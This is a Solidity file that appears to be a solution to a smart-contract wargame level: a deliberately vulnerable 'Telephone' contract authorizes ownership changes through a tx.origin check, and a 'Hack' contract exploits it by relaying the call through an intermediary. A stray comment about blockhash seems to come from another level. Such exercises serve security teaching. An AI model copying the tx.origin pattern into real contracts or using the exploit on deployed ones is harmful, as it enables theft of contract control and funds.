// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

/**
Claim ownership of the contract below to complete this level.

  Things that might help

See the Help page above, section "Beyond the console"
**/
contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

interface TelephoneI {
  function changeOwner(address _owner) external;
  function owner() external view returns(address);
}

/**
blockhash(block.number.sub(1)) doesn't work on remix env
**/
contract Hack {

  TelephoneI telephone;
  constructor(address _add){
    telephone = TelephoneI(_add);
  }

  function owner() public view returns(address) {
    return telephone.owner();
  }
  
  function hack() public {
    telephone.changeOwner(msg.sender);
  }

  
}
